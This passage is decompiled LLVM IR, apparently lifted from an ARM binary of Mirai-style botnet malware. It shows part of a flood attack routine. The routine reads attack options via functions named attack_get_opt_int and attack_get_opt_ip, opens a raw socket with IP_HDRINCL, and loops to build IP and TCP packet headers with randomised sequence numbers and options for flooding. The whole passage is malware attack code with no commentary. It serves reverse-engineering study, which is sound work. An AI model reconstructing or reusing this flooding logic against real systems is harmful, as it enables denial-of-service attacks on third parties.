  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c264 = load i32, i32* @r4, align 4
  store i32 %v0_c264, i32* %r0.global-to-local, align 4
  %v6_c26c = inttoptr i32 %v0_c258 to i32*
  %v7_c26c = call i32 @attack_get_opt_int(i32 %v0_c264, i32* %v6_c26c, i32 5, i32 1)
  %v1_c278 = urem i32 %v7_c26c, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c284 = load i32, i32* @r5, align 4
  store i32 %v0_c284, i32* %r1.global-to-local, align 4
  %v0_c288 = load i32, i32* @r4, align 4
  store i32 %v0_c288, i32* %r0.global-to-local, align 4
  %v5_c290 = inttoptr i32 %v0_c284 to i32*
  %v6_c290 = call i32 @attack_get_opt_int(i32 %v0_c288, i32* %v5_c290, i32 6, i32 65535)
  %v0_c298 = load i32, i32* @r5, align 4
  store i32 %v0_c298, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_c290, i32* %fp.global-to-local, align 4
  %v0_c2a8 = load i32, i32* @r4, align 4
  store i32 %v0_c2a8, i32* %r0.global-to-local, align 4
  %v4_c2ac = inttoptr i32 %v0_c298 to i32*
  %v5_c2ac = call i32 @attack_get_opt_int(i32 %v0_c2a8, i32* %v4_c2ac, i32 7, i32 65535)
  %v0_c2b4 = load i32, i32* @r5, align 4
  store i32 %v0_c2b4, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_c2ac, i32* @r6, align 4
  %v0_c2c4 = load i32, i32* @r4, align 4
  store i32 %v0_c2c4, i32* %r0.global-to-local, align 4
  %v4_c2c8 = inttoptr i32 %v0_c2b4 to i32*
  %v5_c2c8 = call i32 @attack_get_opt_int(i32 %v0_c2c4, i32* %v4_c2c8, i32 17, i32 65535)
  %v0_c2cc = load i32, i32* @r5, align 4
  store i32 %v0_c2cc, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2dc = load i32, i32* @r4, align 4
  store i32 %v0_c2dc, i32* %r0.global-to-local, align 4
  %v5_c2e0 = inttoptr i32 %v0_c2cc to i32*
  %v6_c2e0 = call i32 @attack_get_opt_int(i32 %v0_c2dc, i32* %v5_c2e0, i32 18, i32 0)
  %v0_c2e4 = load i32, i32* @r5, align 4
  store i32 %v0_c2e4, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2f4 = load i32, i32* @r4, align 4
  store i32 %v0_c2f4, i32* %r0.global-to-local, align 4
  %v5_c2f8 = inttoptr i32 %v0_c2e4 to i32*
  %v6_c2f8 = call i32 @attack_get_opt_int(i32 %v0_c2f4, i32* %v5_c2f8, i32 11, i32 0)
  %v0_c2fc = load i32, i32* @r5, align 4
  store i32 %v0_c2fc, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c30c = load i32, i32* @r4, align 4
  store i32 %v0_c30c, i32* %r0.global-to-local, align 4
  %v5_c310 = inttoptr i32 %v0_c2fc to i32*
  %v6_c310 = call i32 @attack_get_opt_int(i32 %v0_c30c, i32* %v5_c310, i32 12, i32 0)
  %v0_c314 = load i32, i32* @r5, align 4
  store i32 %v0_c314, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c324 = load i32, i32* @r4, align 4
  store i32 %v0_c324, i32* %r0.global-to-local, align 4
  %v5_c328 = inttoptr i32 %v0_c314 to i32*
  %v6_c328 = call i32 @attack_get_opt_int(i32 %v0_c324, i32* %v5_c328, i32 13, i32 0)
  %v0_c32c = load i32, i32* @r5, align 4
  store i32 %v0_c32c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c33c = load i32, i32* @r4, align 4
  store i32 %v0_c33c, i32* %r0.global-to-local, align 4
  %v5_c340 = inttoptr i32 %v0_c32c to i32*
  %v6_c340 = call i32 @attack_get_opt_int(i32 %v0_c33c, i32* %v5_c340, i32 14, i32 0)
  %v0_c344 = load i32, i32* @r5, align 4
  store i32 %v0_c344, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c354 = load i32, i32* @r4, align 4
  store i32 %v0_c354, i32* %r0.global-to-local, align 4
  %v5_c358 = inttoptr i32 %v0_c344 to i32*
  %v6_c358 = call i32 @attack_get_opt_int(i32 %v0_c354, i32* %v5_c358, i32 15, i32 1)
  %v0_c35c = load i32, i32* @r5, align 4
  store i32 %v0_c35c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c36c = load i32, i32* @r4, align 4
  store i32 %v0_c36c, i32* %r0.global-to-local, align 4
  %v5_c370 = inttoptr i32 %v0_c35c to i32*
  %v6_c370 = call i32 @attack_get_opt_int(i32 %v0_c36c, i32* %v5_c370, i32 16, i32 0)
  %v2_c37c = load i32, i32* @global_var_25d48.57, align 4
  store i32 %v2_c37c, i32* %r3.global-to-local, align 4
  %v0_c380 = load i32, i32* @r5, align 4
  store i32 %v0_c380, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_c388 = load i32, i32* @r4, align 4
  store i32 %v0_c388, i32* %r0.global-to-local, align 4
  %v5_c38c = inttoptr i32 %v0_c380 to i32*
  %v6_c38c = call i32 @attack_get_opt_ip(i32 %v0_c388, i32* %v5_c38c, i32 25, i32 %v2_c37c, i32 %v6_c370)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c3a0 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_c3a0, i32* %r0.global-to-local, align 4
  %v7_c3a4 = icmp eq i32 %v3_c3a0, -1
  store i1 %v7_c3a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c3a0, i32* @sl, align 4
  br i1 %v7_c3a4, label %dec_label_pc_c878, label %dec_label_pc_c3b0

dec_label_pc_c3b0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c3b8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c3b8, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c3cc = call i32 @__GI_setsockopt(i32 %v3_c3a0, i32 0, i32 3, i32 %v6_c3b8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_c3cc, i32* %r0.global-to-local, align 4
  %v7_c3d0 = icmp eq i32 %v5_c3cc, -1
  store i1 %v7_c3d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c3d0, label %dec_label_pc_c870, label %dec_label_pc_c3d8

dec_label_pc_c3d8:                                ; preds = %dec_label_pc_c3b0
  %v3_c3e0 = mul i32 %v7_c234, 65536
  store i32 %v3_c3e0, i32* %r0.global-to-local, align 4
  %v0_c3e4 = load i32, i32* %fp.global-to-local, align 4
  %v3_c3e4 = mul i32 %v0_c3e4, 65536
  store i32 %v3_c3e4, i32* %r4.global-to-local, align 4
  %v0_c3e8 = load i32, i32* @r6, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_c2f8, i32* %r2.global-to-local, align 4
  %v3_c3f4 = urem i32 %v7_c234, 65536
  store i32 %v3_c3f4, i32* %r3.global-to-local, align 4
  %v3_c3f8 = urem i32 %v0_c3e4, 65536
  %v3_c3fc = urem i32 %v0_c3e8, 65536
  store i32 %v3_c3fc, i32* %r1.global-to-local, align 4
  %v0_c400 = load i32, i32* @r7, align 4
  %v2_c400 = icmp eq i32 %v0_c400, 0
  store i1 %v2_c400, i1* %cpsr_z.global-to-local, align 1
  %v1_c410 = urem i32 %v6_c2f8, 256
  store i32 %v1_c410, i32* @fp, align 4
  br i1 %v2_c400, label %dec_label_pc_c664.preheader, label %dec_label_pc_c418

dec_label_pc_c418:                                ; preds = %dec_label_pc_c3d8
  %tmp52 = mul i32 %v5_c2c8, 256
  %v3_c430 = and i32 %tmp52, 65280
  %tmp53 = udiv i32 %v7_c234, 256
  %v3_c434 = urem i32 %tmp53, 256
  %tmp54 = udiv i32 %v5_c2c8, 256
  %v4_c43c = urem i32 %tmp54, 256
  %v5_c43c = or i32 %v4_c43c, %v3_c430
  store i32 %v5_c43c, i32* @lr, align 4
  %v1_c438 = mul i32 %v7_c234, 256
  %v4_c440 = and i32 %v1_c438, 65280
  %v5_c440 = or i32 %v4_c440, %v3_c434
  %tmp55 = mul i32 %v0_c3e4, 256
  %v3_c44c = and i32 %tmp55, 65280
  %tmp56 = mul i32 %v0_c3e8, 256
  %v3_c450 = and i32 %tmp56, 65280
  %v1_c454 = urem i32 %v6_c2f8, 2
  %v1_c458 = urem i32 %v6_c310, 2
  %tmp57 = udiv i32 %v0_c3e4, 256
  %v4_c45c = urem i32 %tmp57, 256
  %v5_c45c = or i32 %v4_c45c, %v3_c44c
  store i32 %v5_c45c, i32* @r6, align 4
  %tmp58 = udiv i32 %v0_c3e8, 256
  %v4_c460 = urem i32 %tmp58, 256
  %v5_c460 = or i32 %v4_c460, %v3_c450
  store i32 %v5_c460, i32* @r5, align 4
  %v1_c47c = urem i32 %v6_c328, 2
  store i32 %v1_c47c, i32* %r2.global-to-local, align 4
  %v1_c480 = urem i32 %v6_c340, 2
  store i32 %v1_c480, i32* %r3.global-to-local, align 4
  %v1_c484 = urem i32 %v6_c358, 2
  store i32 %v1_c484, i32* %r0.global-to-local, align 4
  %v1_c488 = urem i32 %v6_c370, 2
  store i32 %v1_c488, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext4 = mul nuw i32 %v5_c440, 65536
  %v4_c510 = sdiv i32 %sext4, 65536
  %tmp = sub nsw i32 0, %v1_c458
  %v4_c574 = and i32 %tmp, 16
  %tmp62 = sub nsw i32 0, %v1_c47c
  %v4_c588 = and i32 %tmp62, 8
  %tmp63 = sub nsw i32 0, %v1_c480
  %v4_c5a0 = and i32 %tmp63, 4
  %tmp64 = sub nsw i32 0, %v1_c484
  %v3_c5b4 = and i32 %tmp64, 2
  %v1_c504 = trunc i32 %v6_c24c to i8
  br label %dec_label_pc_c4a8

dec_label_pc_c4a8:                                ; preds = %bb61, %dec_label_pc_c418
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_c4b0 = call i32 @calloc(i32 128, i32 1)
  store i32 %v2_c4b0, i32* %r0.global-to-local, align 4
  %v3_c4b4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c4b4, i32* %r2.global-to-local, align 4
  %v1_c4b8 = load i32, i32* @sb, align 4
  %v2_c4b8 = load i32, i32* @r4, align 4
  %v5_c4b8 = mul i32 %v2_c4b8, 4
  %v6_c4b8 = add i32 %v5_c4b8, %v1_c4b8
  %v7_c4b8 = inttoptr i32 %v6_c4b8 to i32*
  store i32 %v2_c4b0, i32* %v7_c4b8, align 4
  %v0_c4bc = load i32, i32* %r2.global-to-local, align 4
  %v3_c4bc = mul i32 %v0_c4bc, 32
  store i32 %v3_c4bc, i32* %r3.global-to-local, align 4
  %v0_c4c0 = load i32, i32* @sb, align 4
  %v4_c4c0 = mul i32 %v0_c4bc, 4
  %v5_c4c0 = add i32 %v0_c4c0, %v4_c4c0
  %v6_c4c0 = inttoptr i32 %v5_c4c0 to i32*
  %v7_c4c0 = load i32, i32* %v6_c4c0, align 4
  store i32 %v7_c4c0, i32* %r4.global-to-local, align 4
  %v5_c4c4 = mul i32 %v0_c4bc, 24
  store i32 %v5_c4c4, i32* %r3.global-to-local, align 4
  %v1_c4c8 = load i32, i32* @r8, align 4
  %v2_c4c8 = add i32 %v1_c4c8, %v5_c4c4
  store i32 %v2_c4c8, i32* %r0.global-to-local, align 4
  %v1_c4cc = inttoptr i32 %v7_c4c0 to i8*
  %v2_c4cc = load i8, i8* %v1_c4cc, align 1
  %tmp65 = urem i8 %v2_c4cc, 16
  %v1_c4d0 = zext i8 %tmp65 to i32
  %v1_c4d4 = or i32 %v1_c4d0, 64
  store i32 %v1_c4d4, i32* %r3.global-to-local, align 4
  %v1_c4d8 = trunc i32 %v1_c4d4 to i8
  store i8 %v1_c4d8, i8* %v1_c4cc, align 1
  %v0_c4dc = load i32, i32* %r4.global-to-local, align 4
  %v1_c4dc = inttoptr i32 %v0_c4dc to i8*
  %v2_c4dc = load i8, i8* %v1_c4dc, align 1
  %v1_c4e0 = and i8 %v2_c4dc, -16
  %v1_c4e4 = or i8 %v1_c4e0, 5
  store i32 %v1_c278, i32* %r3.global-to-local, align 4
  store i8 %v1_c4e4, i8* %v1_c4dc, align 1
  %v2_c4f4 = load i32, i32* %r4.global-to-local, align 4
  %v3_c4f4 = add i32 %v2_c4f4, 1
  %v4_c4f4 = inttoptr i32 %v3_c4f4 to i8*
  store i8 %v5_c230, i8* %v4_c4f4, align 1
  store i32 %v1_c254, i32* %r2.global-to-local, align 4
  %v0_c4fc = load i32, i32* %r3.global-to-local, align 4
  %v2_c4fc = icmp eq i32 %v0_c4fc, 0
  store i1 %v2_c4fc, i1* %cpsr_z.global-to-local, align 1
  store i32 15360, i32* %r3.global-to-local, align 4
  %v2_c504 = load i32, i32* %r4.global-to-local, align 4
  %v3_c504 = add i32 %v2_c504, 8
  %v4_c504 = inttoptr i32 %v3_c504 to i8*
  store i8 %v1_c504, i8* %v4_c504, align 1
  %v0_c508 = load i32, i32* %r3.global-to-local, align 4
  %v1_c508 = trunc i32 %v0_c508 to i16
  %v2_c508 = load i32, i32* %r4.global-to-local, align 4
  %v3_c508 = add i32 %v2_c508, 2
  %v4_c508 = inttoptr i32 %v3_c508 to i16*
  store i16 %v1_c508, i16* %v4_c508, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_c510, i32* %r1.global-to-local, align 4
  %v0_c514 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c514, label %bb59, label %bb

bb:                                               ; preds = %dec_label_pc_c4a8
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_c4a8, %bb
  %v2_c518 = load i32, i32* %r4.global-to-local, align 4
  %v3_c518 = add i32 %v2_c518, 9
  %v4_c518 = inttoptr i32 %v3_c518 to i8*
  store i8 6, i8* %v4_c518, align 1
  %v0_c51c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c51c, label %bb61, label %bb60

bb60:                                             ; preds = %bb59
  %v1_c51c = load i32, i32* %r2.global-to-local, align 4
  %v2_c51c = trunc i32 %v1_c51c to i16
  %v3_c51c = load i32, i32* %r4.global-to-local, align 4
  %v4_c51c = add i32 %v3_c51c, 6
  %v5_c51c = inttoptr i32 %v4_c51c to i16*
  store i16 %v2_c51c, i16* %v5_c51c, align 2
  br label %bb61

bb61:                                             ; preds = %bb59, %bb60
  store i32 %v6_c38c, i32* %r2.global-to-local, align 4
  %v1_c524 = load i32, i32* %r4.global-to-local, align 4
  %v2_c524 = add i32 %v1_c524, 12
  %v3_c524 = inttoptr i32 %v2_c524 to i32*
  store i32 %v6_c38c, i32* %v3_c524, align 4
  %v0_c528 = load i32, i32* %r0.global-to-local, align 4
  %v1_c528 = add i32 %v0_c528, 16
  %v2_c528 = inttoptr i32 %v1_c528 to i32*
  %v3_c528 = load i32, i32* %v2_c528, align 4
  store i32 %v3_c528, i32* %r3.global-to-local, align 4
  %v0_c52c = load i32, i32* %r1.global-to-local, align 4
  %v1_c52c = trunc i32 %v0_c52c to i16
  %v2_c52c = load i32, i32* %r4.global-to-local, align 4
  %v3_c52c = add i32 %v2_c52c, 4
  %v4_c52c = inttoptr i32 %v3_c52c to i16*
  store i16 %v1_c52c, i16* %v4_c52c, align 2
  %v0_c530 = load i32, i32* %r3.global-to-local, align 4
  %v1_c530 = load i32, i32* %r4.global-to-local, align 4
  %v2_c530 = add i32 %v1_c530, 16
  %v3_c530 = inttoptr i32 %v2_c530 to i32*
  store i32 %v0_c530, i32* %v3_c530, align 4
  %v0_c534 = load i32, i32* @r6, align 4
  %v1_c534 = trunc i32 %v0_c534 to i16
  %v2_c534 = load i32, i32* %r4.global-to-local, align 4
  %v3_c534 = add i32 %v2_c534, 20
  %v4_c534 = inttoptr i32 %v3_c534 to i16*
  store i16 %v1_c534, i16* %v4_c534, align 2
  %v0_c538 = load i32, i32* %r4.global-to-local, align 4
  %v1_c538 = add i32 %v0_c538, 20
  store i32 %v1_c538, i32* %r1.global-to-local, align 4
  %v1_c53c = add i32 %v0_c538, 32
  %v2_c53c = inttoptr i32 %v1_c53c to i8*
  %v3_c53c = load i8, i8* %v2_c53c, align 1
  %v4_c53c = zext i8 %v3_c53c to i32
  store i32 %v4_c53c, i32* %r3.global-to-local, align 4
  %v1_c540 = add i32 %v0_c538, 33
  %v2_c540 = inttoptr i32 %v1_c540 to i8*
  %v3_c540 = load i8, i8* %v2_c540, align 1
  %v4_c540 = zext i8 %v3_c540 to i32
  store i32 %v1_c454, i32* %r0.global-to-local, align 4
  %v1_c548 = urem i8 %v3_c53c, 16
  %v1_c54c = or i8 %v1_c548, -96
  %v1_c550 = and i32 %v4_c540, 223
  store i32 %v1_c550, i32* %r2.global-to-local, align 4
  store i8 %v1_c54c, i8* %v2_c53c, align 1
  %v0_c558 = load i32, i32* %r2.global-to-local, align 4
  %v1_c558 = load i32, i32* %r0.global-to-local, align 4
  %v4_c558 = mul i32 %v1_c558, 32
  %v5_c558 = or i32 %v4_c558, %v0_c558
  store i32 %v5_c558, i32* %r2.global-to-local, align 4
  store i32 %v5_c43c, i32* %r3.global-to-local, align 4
  %v1_c560 = trunc i32 %v5_c558 to i8
  %v2_c560 = load i32, i32* %r1.global-to-local, align 4
  %v3_c560 = add i32 %v2_c560, 13
  %v4_c560 = inttoptr i32 %v3_c560 to i8*
  store i8 %v1_c560, i8* %v4_c560, align 1
  %v0_c564 = load i32, i32* %r3.global-to-local, align 4
  %v1_c564 = load i32, i32* %r1.global-to-local, align 4
  %v2_c564 = add i32 %v1_c564, 4
  %v3_c564 = inttoptr i32 %v2_c564 to i32*
  store i32 %v0_c564, i32* %v3_c564, align 4
  %v0_c568 = load i32, i32* %r1.global-to-local, align 4
  %v1_c568 = add i32 %v0_c568, 13
  %v2_c568 = inttoptr i32 %v1_c568 to i8*
  %v3_c568 = load i8, i8* %v2_c568, align 1
  %v4_c568 = zext i8 %v3_c568 to i32
  store i32 %v1_c458, i32* %r0.global-to-local, align 4
  %v1_c570 = and i32 %v4_c568, 239
  %v5_c574 = or i32 %v1_c570, %v4_c574
  store i32 %v5_c574, i32* %r3.global-to-local, align 4
  %v1_c578 = trunc i32 %v5_c574 to i8
  store i8 %v1_c578, i8* %v2_c568, align 1
  %v0_c57c = load i32, i32* %r1.global-to-local, align 4
  %v1_c57c = add i32 %v0_c57c, 13
  %v2_c57c = inttoptr i32 %v1_c57c to i8*
  %v3_c57c = load i8, i8* %v2_c57c, align 1
  %v4_c57c = zext i8 %v3_c57c to i32
  store i32 %v1_c47c, i32* %r3.global-to-local, align 4
  %v1_c584 = and i32 %v4_c57c, 247
  %v5_c588 = or i32 %v1_c584, %v4_c588
  store i32 %v5_c588, i32* %r2.global-to-local, align 4
  %v0_c58c = load i32, i32* @r5, align 4
  %v1_c58c = trunc i32 %v0_c58c to i16
  %v3_c58c = add i32 %v0_c57c, 2
  %v4_c58c = inttoptr i32 %v3_c58c to i16*
  store i16 %v1_c58c, i16* %v4_c58c, align 2
  %v0_c590 = load i32, i32* %r2.global-to-local, align 4
  %v1_c590 = trunc i32 %v0_c590 to i8
  %v2_c590 = load i32, i32* %r1.global-to-local, align 4
  %v3_c590 = add i32 %v2_c590, 13
  %v4_c590 = inttoptr i32 %v3_c590 to i8*
  store i8 %v1_c590, i8* %v4_c590, align 1
  %v0_c594 = load i32, i32* %r1.global-to-local, align 4
  %v1_c594 = add i32 %v0_c594, 13
  %v2_c594 = inttoptr i32 %v1_c594 to i8*
  %v3_c594 = load i8, i8* %v2_c594, align 1
  %v4_c594 = zext i8 %v3_c594 to i32
  store i32 %v1_c480, i32* %r0.global-to-local, align 4
  %v1_c59c = and i32 %v4_c594, 251
  %v5_c5a0 = or i32 %v1_c59c, %v4_c5a0
  store i32 %v5_c5a0, i32* %r3.global-to-local, align 4
  %v1_c5a4 = trunc i32 %v5_c5a0 to i8
  store i8 %v1_c5a4, i8* %v2_c594, align 1
  %v0_c5a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_c5a8 = add i32 %v0_c5a8, 13
  %v2_c5a8 = inttoptr i32 %v1_c5a8 to i8*
  %v3_c5a8 = load i8, i8* %v2_c5a8, align 1
  %v4_c5a8 = zext i8 %v3_c5a8 to i32
  store i32 %v1_c484, i32* %r3.global-to-local, align 4
  %v1_c5b0 = and i32 %v4_c5a8, 253
  %v4_c5b4 = or i32 %v1_c5b0, %v3_c5b4
  store i32 %v4_c5b4, i32* %r2.global-to-local, align 4
  %v1_c5b8 = trunc i32 %v4_c5b4 to i8
  store i8 %v1_c5b8, i8* %v2_c5a8, align 1
  %v0_c5bc = load i32, i32* %r1.global-to-local, align 4
  %v1_c5bc = add i32 %v0_c5bc, 13
  %v2_c5bc = inttoptr i32 %v1_c5bc to i8*
  %v3_c5bc = load i8, i8* %v2_c5bc, align 1
  %v4_c5bc = zext i8 %v3_c5bc to i32
  store i32 %v1_c488, i32* %r0.global-to-local, align 4
  %v1_c5c4 = and i32 %v4_c5bc, 254
  %v2_c5c8 = or i32 %v1_c5c4, %v1_c488
  store i32 %v2_c5c8, i32* %r3.global-to-local, align 4
  %v1_c5cc = trunc i32 %v2_c5c8 to i8
  store i8 %v1_c5cc, i8* %v2_c5bc, align 1
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_c5d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c5d8 = add i32 %v2_c5d8, 40
  %v4_c5d8 = inttoptr i32 %v3_c5d8 to i8*
  store i8 2, i8* %v4_c5d8, align 1
  %v0_c5dc = load i32, i32* %r2.global-to-local, align 4
  %v1_c5dc = trunc i32 %v0_c5dc to i8
  %v2_c5dc = load i32, i32* %r4.global-to-local, align 4
  %v3_c5dc = add i32 %v2_c5dc, 41
  %v4_c5dc = inttoptr i32 %v3_c5dc to i8*
  store i8 %v1_c5dc, i8* %v4_c5dc, align 1
  %v0_c5e0 = call i32 @rand_next()
  %v1_c5e4 = urem i32 %v0_c5e0, 16
  %v1_c5e8 = or i32 %v1_c5e4, 1392
  %tmp66 = mul nuw nsw i32 %v1_c5e8, 256
  %v3_c5f4 = add nuw nsw i32 %tmp66, 2048
  %v1_c5f8 = and i32 %v3_c5f4, ptrtoint (i32* @global_var_ff00.32 to i32)
  %v5_c5fc = or i32 %v1_c5f8, 5
  %v1_c600 = trunc i32 %v5_c5fc to i16
  %v2_c600 = load i32, i32* %r4.global-to-local, align 4
  %v3_c600 = add i32 %v2_c600, 42
  %v4_c600 = inttoptr i32 %v3_c600 to i16*
  store i16 %v1_c600, i16* %v4_c600, align 2
  %v2_c608 = load i32, i32* %r4.global-to-local, align 4
  %v3_c608 = add i32 %v2_c608, 44
  %v4_c608 = inttoptr i32 %v3_c608 to i8*
  store i8 4, i8* %v4_c608, align 1
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_c618 = load i32, i32* %r4.global-to-local, align 4
  %v3_c618 = add i32 %v2_c618, 46
  %v4_c618 = inttoptr i32 %v3_c618 to i8*
  store i8 8, i8* %v4_c618, align 1
  %v0_c61c = load i32, i32* %r2.global-to-local, align 4
  %v1_c61c = trunc i32 %v0_c61c to i8
  %v2_c61c = load i32, i32* %r4.global-to-local, align 4
  %v3_c61c = add i32 %v2_c61c, 47
  %v4_c61c = inttoptr i32 %v3_c61c to i8*
  store i8 %v1_c61c, i8* %v4_c61c, align 1
  %v0_c620 = load i32, i32* %r0.global-to-local, align 4
  %v1_c620 = trunc i32 %v0_c620 to i8
  %v2_c620 = load i32, i32* %r4.global-to-local, align 4
  %v3_c620 = add i32 %v2_c620, 45
  %v4_c620 = inttoptr i32 %v3_c620 to i8*
  store i8 %v1_c620, i8* %v4_c620, align 1
  %v0_c624 = call i32 @rand_next()
  store i32 %v0_c624, i32* %r0.global-to-local, align 4
  %v2_c62c = load i32, i32* %r4.global-to-local, align 4
  %v3_c62c = add i32 %v2_c62c, 59
  %v4_c62c = inttoptr i32 %v3_c62c to i8*
  store i8 6, i8* %v4_c62c, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_c63c = load i32, i32* %r4.global-to-local, align 4
  %v2_c63c = add i32 %v1_c63c, 48
  %v3_c63c = inttoptr i32 %v2_c63c to i32*
  store i32 %v0_c624, i32* %v3_c63c, align 4
  %v0_c640 = load i32, i32* %r3.global-to-local, align 4
  %v1_c640 = load i32, i32* %r4.global-to-local, align 4
  %v2_c640 = add i32 %v1_c640, 52
  %v3_c640 = inttoptr i32 %v2_c640 to i32*
  store i32 %v0_c640, i32* %v3_c640, align 4
  %v0_c644 = load i32, i32* %r2.global-to-local, align 4
  %v1_c644 = trunc i32 %v0_c644 to i8
  %v2_c644 = load i32, i32* %r4.global-to-local, align 4
  %v3_c644 = add i32 %v2_c644, 56
  %v4_c644 = inttoptr i32 %v3_c644 to i8*
  store i8 %v1_c644, i8* %v4_c644, align 1
  %v0_c648 = load i32, i32* %r1.global-to-local, align 4
  %v1_c648 = trunc i32 %v0_c648 to i8
  %v2_c648 = load i32, i32* %r4.global-to-local, align 4
  %v3_c648 = add i32 %v2_c648, 58
  %v4_c648 = inttoptr i32 %v3_c648 to i8*
  store i8 %v1_c648, i8* %v4_c648, align 1
  %v0_c64c = load i32, i32* %r1.global-to-local, align 4
  %v1_c64c = trunc i32 %v0_c64c to i8
  %v2_c64c = load i32, i32* %r4.global-to-local, align 4
  %v3_c64c = add i32 %v2_c64c, 57
  %v4_c64c = inttoptr i32 %v3_c64c to i8*
  store i8 %v1_c64c, i8* %v4_c64c, align 1
  %v3_c650 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c650, i32* %r3.global-to-local, align 4
  %v1_c654 = load i32, i32* %r2.global-to-local, align 4
  %v2_c654 = add i32 %v1_c654, %v3_c650
  store i32 %v2_c654, i32* @r4, align 4
  %v1_c658 = load i32, i32* @r7, align 4
  %v9_c658 = icmp eq i32 %v2_c654, %v1_c658
  store i1 %v9_c658, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_c654, i32* %stack_var_-44, align 4
  %v5_c660 = icmp slt i32 %v2_c654, %v1_c658
  br i1 %v5_c660, label %dec_label_pc_c4a8, label %dec_label_pc_c664.preheader

dec_label_pc_c664.preheader:                      ; preds = %bb61, %dec_label_pc_c3d8
  %v0_c6686 = phi i32 [ 0, %dec_label_pc_c3d8 ], [ %v1_c658, %bb61 ]
  %v3_c7e0 = icmp eq i32 %v6_c38c, -1
  %v8_c7e0 = icmp eq i32 %v6_c38c, -1
  %v3_c6b0 = icmp eq i32 %v3_c3f4, 65535
  br label %dec_label_pc_c664

dec_label_pc_c664:                                ; preds = %dec_label_pc_c664, %dec_label_pc_c774, %dec_label_pc_c664.preheader
  %v0_c668 = phi i32 [ %v0_c6686, %dec_label_pc_c664.preheader ], [ 0, %dec_label_pc_c774 ], [ 0, %dec_label_pc_c664 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c668 = icmp eq i32 %v0_c668, 0
  store i1 %v2_c668, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c668, label %dec_label_pc_c664, label %dec_label_pc_c674

dec_label_pc_c674:                                ; preds = %dec_label_pc_c664, %dec_label_pc_c774
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c678

dec_label_pc_c678:                                ; preds = %dec_label_pc_c6f0, %dec_label_pc_c674
  %v1_c688 = phi i32 [ %v1_c764, %dec_label_pc_c6f0 ], [ 0, %dec_label_pc_c674 ]
  %v5_c67c = mul i32 %v1_c688, 24
  %v1_c680 = load i32, i32* @r8, align 4
  %v2_c680 = add i32 %v1_c680, %v5_c67c
  store i32 %v2_c680, i32* %r3.global-to-local, align 4
  %v1_c684 = add i32 %v2_c680, 20
  %v2_c684 = inttoptr i32 %v1_c684 to i8*
  %v3_c684 = load i8, i8* %v2_c684, align 1
  %v4_c684 = zext i8 %v3_c684 to i32
  store i32 %v4_c684, i32* %r2.global-to-local, align 4
  %v0_c688 = load i32, i32* @sb, align 4
  %v4_c688 = mul i32 %v1_c688, 4
  %v5_c688 = add i32 %v0_c688, %v4_c688
  %v6_c688 = inttoptr i32 %v5_c688 to i32*
  %v7_c688 = load i32, i32* %v6_c688, align 4
  store i32 %v7_c688, i32* @r5, align 4
  %v7_c68c = icmp eq i8 %v3_c684, 31
  store i1 %v7_c68c, i1* %cpsr_z.global-to-local, align 1
  %v1_c690 = add i32 %v7_c688, 20
  store i32 %v1_c690, i32* @r6, align 4
  %tmp67 = icmp ult i8 %v3_c684, 32
